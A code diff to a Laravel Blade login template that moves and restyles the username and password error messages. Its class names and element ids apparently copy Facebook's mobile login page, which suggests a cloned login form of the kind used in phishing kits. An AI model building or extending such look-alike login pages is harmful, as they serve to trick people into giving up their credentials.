@@ -59,28 +59,22 @@
                                                 <div class="_96n9">
                                                     <input type="text" class="_56bg _4u9z _5ruq _8qtn" name="username" placeholder="{{ __('Email address or phone number') }}">
                                                 </div>
-                                                @if($errors->has('username'))
-                                                    <div class="error-message"><span class="text-danger">{{ $errors->first('username') }}</span></div>
-                                                @endif
                                             </div>
                                         </div>
+                                        @if($errors->has('username'))
+                                            <div class="error-message"><span class="text-danger" style="color: red">{{ $errors->first('username') }}</span></div>
+                                        @endif
                                         <div class="_55wq"></div>
                                         <div class="_56be">
                                             <div class="_55wo _56bf">
-                                                <div class="_1upc _mg8">
-                                                    <div class="_7om2">
-                                                        <div class="_4g34 _5i2i _52we">
-                                                            <div class="_5xu4">
-                                                                <input class="_56bg _4u9z _27z2 _8qtm" name="password" placeholder="{{ __('Password') }}" type="password">
-                                                            </div>
-                                                            @if($errors->has('password'))
-                                                                <div class="error-message"><span class="text-danger">{{ $errors->first('password') }}</span></div>
-                                                            @endif
-                                                        </div>
-                                                    </div>
+                                                <div class="_96n9">
+                                                    <input type="password" class="_56bg _4u9z _5ruq _8qtn" name="password" placeholder="{{ __('Password') }}">
                                                 </div>
                                             </div>
                                         </div>
+                                        @if($errors->has('password'))
+                                            <div class="error-message"><span class="text-danger" style="color: red">{{ $errors->first('password') }}</span></div>
+                                        @endif
                                     </div>
                                     <div class="_2pie" style="text-align:center;">
                                         <div id="login_password_step_element"
